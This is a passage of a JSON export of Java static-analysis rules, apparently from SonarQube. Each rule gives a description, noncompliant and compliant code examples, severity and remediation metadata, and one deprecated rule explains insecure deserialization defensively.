            "mdDesc": "<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection\ndetermines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void dispose() throws Throwable {\n  this.finalize();                       // Noncompliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/586.html\">MITRE, CWE-586</a> - Explicit Call to Finalize() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2200",
            "repo": "java",
            "name": "\"compareTo\" results should not be checked for specific values",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific\nvalue other than 0 could result in false negatives.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myClass.compareTo(arg) == -1) {  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (myClass.compareTo(arg) &lt; 0) {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific\nvalue other than 0 could result in false negatives.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myClass.compareTo(arg) == -1) {  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (myClass.compareTo(arg) &lt; 0) {\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2442",
            "repo": "java",
            "name": "\"Lock\" objects should not be \"synchronized\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with\n<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly. Instead, such\nobjects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nLock lock = new MyLockImpl();\nsynchronized(lock) {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nLock lock = new MyLockImpl();\nlock.tryLock();\n//...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qjdGBQ\">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level concurrency\n  objects </li>\n</ul>",
            "mdDesc": "<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with\n<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly. Instead, such\nobjects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nLock lock = new MyLockImpl();\nsynchronized(lock) {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nLock lock = new MyLockImpl();\nlock.tryLock();\n//...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qjdGBQ\">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level concurrency\n  objects </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "clumsy",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2681",
            "repo": "java",
            "name": "Multiline blocks should be enclosed in curly braces",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be\nmisleading and induce bugs.</p>\n<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but\nthe omission of curly braces means the lines will be unconditionally executed once.</p>\n<p>Note that this rule considers tab characters to be equivalent to 1 space. If you mix spaces and tabs you will sometimes see issues in code which\nlook fine in your editor but are confusing when you change the size of tabs.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant; executed unconditionally\nthirdAction();\n\nif (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally\n\nif (condition) firstActionInBlock();  // Noncompliant\n  secondAction();  // Executed unconditionally\n\nif (condition); secondAction();  // Noncompliant; secondAction executed unconditionally\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++)\n  str = array[i];\n  doTheThing(str);  // Noncompliant; executed only on last array element\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition) {\n  firstActionInBlock();\n  secondAction();\n}\nthirdAction();\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++) {\n  str = array[i];\n  doTheThing(str);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/483.html\">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MzZGBQ\">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>\n</ul>",
            "mdDesc": "<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be\nmisleading and induce bugs.</p>\n<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but\nthe omission of curly braces means the lines will be unconditionally executed once.</p>\n<p>Note that this rule considers tab characters to be equivalent to 1 space. If you mix spaces and tabs you will sometimes see issues in code which\nlook fine in your editor but are confusing when you change the size of tabs.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant; executed unconditionally\nthirdAction();\n\nif (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally\n\nif (condition) firstActionInBlock();  // Noncompliant\n  secondAction();  // Executed unconditionally\n\nif (condition); secondAction();  // Noncompliant; secondAction executed unconditionally\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++)\n  str = array[i];\n  doTheThing(str);  // Noncompliant; executed only on last array element\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition) {\n  firstActionInBlock();\n  secondAction();\n}\nthirdAction();\n\nString str = null;\nfor (int i = 0; i &lt; array.length; i++) {\n  str = array[i];\n  doTheThing(str);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/483.html\">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MzZGBQ\">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:NoSonar",
            "repo": "java",
            "name": "Track uses of \"NOSONAR\" comments",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results\nbut it can also be used abusively to hide real quality flaws.</p>\n<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>",
            "mdDesc": "<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results\nbut it can also be used abusively to hide real quality flaws.</p>\n<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "internalKey": "S1291",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2440",
            "repo": "java",
            "name": "Classes with only \"static\" methods should not be instantiated",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there's no reason to instantiate a class that has only\n<code>static</code> methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    TextUtils textUtils = new TextUtils(); // Noncompliant\n\n    String stripped = textUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    String stripped = TextUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h2>See Also</h2>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS1118'>S1118</a> - Utility classes should not have public constructors </li>\n</ul>",
            "mdDesc": "<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there's no reason to instantiate a class that has only\n<code>static</code> methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    TextUtils textUtils = new TextUtils(); // Noncompliant\n\n    String stripped = textUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    String stripped = TextUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h2>See Also</h2>\n<ul>\n  <li> {rule:java:S1118} - Utility classes should not have public constructors </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4508",
            "repo": "java",
            "name": "Deserializing objects from an untrusted source is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10654\">CVE-2018-10654</a>: Hazelcast Library: Java deserialization\n  vulnerability </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000058\">CVE-2018-1000058</a>: Jenkins Pipeline: arbitrary code execution\n  vulnerability </li>\n</ul>\n<p>Object deserialization from an untrusted source can lead to unexpected code execution. <code>ObjectInputStream</code> doesn't provide a way to\napply rules on its <code>InputStream</code> argument. Knowing that all serializable classes in the scope of the classloader will be deserialized,\nthere is a possibility that malicious code could be executed during the deserialization phase even if, in the end, a <code>ClassCastException</code>\nwill be raised.</p>\n<p>Deserialization takes a stream of bits and turns it into an object. If the stream contains the type of object you expect, all is well. But if\nyou're deserializing untrusted input, and an attacker has inserted some other type of object, you're in trouble. Why? There are a few different attack\nscenarios, but one widely-documented one goes like this: Deserialization first instantiates an <code>Object</code>, then uses the\n<code>readObject</code> method to populate it. If the attacker has overridden <code>readObject</code> then he is entirely in control of what code\nexecutes during that process. It is only after <code>readObject</code> has completed that your newly-minted <code>Object</code> can be cast to the\ntype you expected. A <code>ClassCastException</code> or <code>ClassNotFoundException</code> will be thrown, but at that point it's too late.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> an attacker could have tampered with the source provided to the deserialization function. </li>\n  <li> you are using an unsafe deserialization function. See the <strong>Recommended Secure Coding Practices</strong> for examples of safe libraries.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<p> </p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To prevent insecure deserialization, you should either use look-ahead deserialization (pre-Java 9) or a filter to make sure you're dealing with the\ncorrect type of object <em>before</em> you act on it.</p>\n<p>Several third-party libraries offer look-ahead deserialization, including:</p>\n<ul>\n  <li> ikkisoft's <code>SerialKiller</code> </li>\n  <li> Apache Commons Class IO's <code>ValidatingObjectInputStream</code> </li>\n  <li> contrast-rO0's <code>SafeObjectInputStream</code> </li>\n</ul>\n<p>Note that it is possible to set a deserialization filter at the level of the JVM, but relying on that requires that your environment be configured\nperfectly. Every time. Additionally, such a filter may have unwanted impacts on other applications in the environment. On the other hand, setting a\nfilter as close as possible to the deserialization that uses it allows you to specify a very narrow, focused filter.</p>\n<p>You should also limit access to the serialized source. For example:</p>\n<ul>\n  <li> if it is a file, restrict the access to it. </li>\n  <li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">OWASP - Deserialization of untrusted data</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION\">OBJECT_DESERIALIZATION </a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10654\">CVE-2018-10654</a>: Hazelcast Library: Java deserialization\n  vulnerability </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000058\">CVE-2018-1000058</a>: Jenkins Pipeline: arbitrary code execution\n  vulnerability </li>\n</ul>\n<p>Object deserialization from an untrusted source can lead to unexpected code execution. <code>ObjectInputStream</code> doesn't provide a way to\napply rules on its <code>InputStream</code> argument. Knowing that all serializable classes in the scope of the classloader will be deserialized,\nthere is a possibility that malicious code could be executed during the deserialization phase even if, in the end, a <code>ClassCastException</code>\nwill be raised.</p>\n<p>Deserialization takes a stream of bits and turns it into an object. If the stream contains the type of object you expect, all is well. But if\nyou're deserializing untrusted input, and an attacker has inserted some other type of object, you're in trouble. Why? There are a few different attack\nscenarios, but one widely-documented one goes like this: Deserialization first instantiates an <code>Object</code>, then uses the\n<code>readObject</code> method to populate it. If the attacker has overridden <code>readObject</code> then he is entirely in control of what code\nexecutes during that process. It is only after <code>readObject</code> has completed that your newly-minted <code>Object</code> can be cast to the\ntype you expected. A <code>ClassCastException</code> or <code>ClassNotFoundException</code> will be thrown, but at that point it's too late.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> an attacker could have tampered with the source provided to the deserialization function. </li>\n  <li> you are using an unsafe deserialization function. See the <strong>Recommended Secure Coding Practices</strong> for examples of safe libraries.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<p> </p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To prevent insecure deserialization, you should either use look-ahead deserialization (pre-Java 9) or a filter to make sure you're dealing with the\ncorrect type of object <em>before</em> you act on it.</p>\n<p>Several third-party libraries offer look-ahead deserialization, including:</p>\n<ul>\n  <li> ikkisoft's <code>SerialKiller</code> </li>\n  <li> Apache Commons Class IO's <code>ValidatingObjectInputStream</code> </li>\n  <li> contrast-rO0's <code>SafeObjectInputStream</code> </li>\n</ul>\n<p>Note that it is possible to set a deserialization filter at the level of the JVM, but relying on that requires that your environment be configured\nperfectly. Every time. Additionally, such a filter may have unwanted impacts on other applications in the environment. On the other hand, setting a\nfilter as close as possible to the deserialization that uses it allows you to specify a very narrow, focused filter.</p>\n<p>You should also limit access to the serialized source. For example:</p>\n<ul>\n  <li> if it is a file, restrict the access to it. </li>\n  <li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">OWASP - Deserialization of untrusted data</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION\">OBJECT_DESERIALIZATION </a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2209",
            "repo": "java",
            "name": "\"static\" members should be accessed statically",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, it's bad form, and considered by most to be misleading\nbecause it implies to the readers of your code that there's an instance of the member per class instance.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    first.counter ++;  // Noncompliant\n    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    A.counter ++;  // Compliant\n    A.counter ++;  // Compliant\n  }\n}\n</pre>",
            "mdDesc": "<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, it's bad form, and considered by most to be misleading\nbecause it implies to the readers of your code that there's an instance of the member per class instance.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    first.counter ++;  // Noncompliant\n    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    A.counter ++;  // Compliant\n    A.counter ++;  // Compliant\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3419",
            "repo": "java",
            "name": "Group ids should follow a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom's <code>groupId</code> does not match\nthe provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>(com|org)(\\.[a-z][a-z-0-9]*)+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;com.myco&lt;/groupId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom's <code>groupId</code> does not match\nthe provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>(com|org)(\\.[a-z][a-z-0-9]*)+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;groupId&gt;com.myco&lt;/groupId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "maven"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "regex",
                    "htmlDesc": "The regular expression the &quot;groupId&quot; should match",
                    "defaultValue": "(com|org)(\\.[a-z][a-z-0-9]*)+",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1119",
            "repo": "java",
            "name": "Labels should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to\nfollow, which reduces the code's readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint matrix[][] = {\n  {1, 2, 3},\n  {4, 5, 6},\n  {7, 8, 9}\n};\n\nouter: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant\n  for (int col = 0; col &lt; matrix[row].length; col++) {\n    if (col == row) {\n      continue outer;\n    }\n    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int row = 1; row &lt; matrix.length; row++) {          // Compliant\n  for (int col = 0; col &lt; row; col++) {\n    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8\n  }\n}\n</pre>",
            "mdDesc": "<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to\nfollow, which reduces the code's readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint matrix[][] = {\n  {1, 2, 3},\n  {4, 5, 6},\n  {7, 8, 9}\n};\n\nouter: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant\n  for (int col = 0; col &lt; matrix[row].length; col++) {\n    if (col == row) {\n      continue outer;\n    }\n    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int row = 1; row &lt; matrix.length; row++) {          // Compliant\n  for (int col = 0; col &lt; row; col++) {\n    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2208",
            "repo": "java",
            "name": "Wildcard imports should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with\nthe same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.sql.*; // Noncompliant\nimport java.util.*; // Noncompliant\n\nprivate Date date; // Date class exists in java.sql and java.util. Which one is this?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.sql.Date;\nimport java.util.List;\nimport java.util.ArrayList;\n\nprivate Date date;\n</pre>\n<h2>Exceptions</h2>\n<p>Static imports are ignored by this rule. E.G.</p>\n<pre>\nimport static java.lang.Math.*;\n</pre>",
            "mdDesc": "<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with\nthe same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.sql.*; // Noncompliant\nimport java.util.*; // Noncompliant\n\nprivate Date date; // Date class exists in java.sql and java.util. Which one is this?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.sql.Date;\nimport java.util.List;\nimport java.util.ArrayList;\n\nprivate Date date;\n</pre>\n<h2>Exceptions</h2>\n<p>Static imports are ignored by this rule. E.G.</p>\n<pre>\nimport static java.lang.Math.*;\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
